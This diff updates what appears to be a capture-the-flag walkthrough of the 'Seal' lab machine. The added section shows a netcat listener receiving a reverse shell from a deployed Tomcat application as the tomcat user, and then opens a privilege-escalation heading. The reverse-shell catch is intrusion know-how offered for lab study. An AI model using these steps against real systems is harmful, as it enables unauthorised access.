@@ -369,10 +369,34 @@ We `select` it into the `deploy` section:
 
 <br />
 
-And finally we `push` it. Now we can `see` the `file` in the `Applications List`:
+And finally we `push` it. We can `see` the `file` in the `Applications List`:
 
 <br />
 
 ![16](../../../assets/images/Seal/16.png)
+
+<br />
+
+Now we only need to `set up` a `listener` and `execute` the `file` in the list `clicking` on `/reverse`:
+
+<br />
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.19] from (UNKNOWN) [10.10.10.250] 41498
+whoami
+tomcat
+id
+uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
+```
+
+<br />
+
+Now we do the `tty sanitization` and perfect! Intrusion is ready!
+
+<br />
+
+# Privilege Escalation: www-data -> luis
 
 <br />
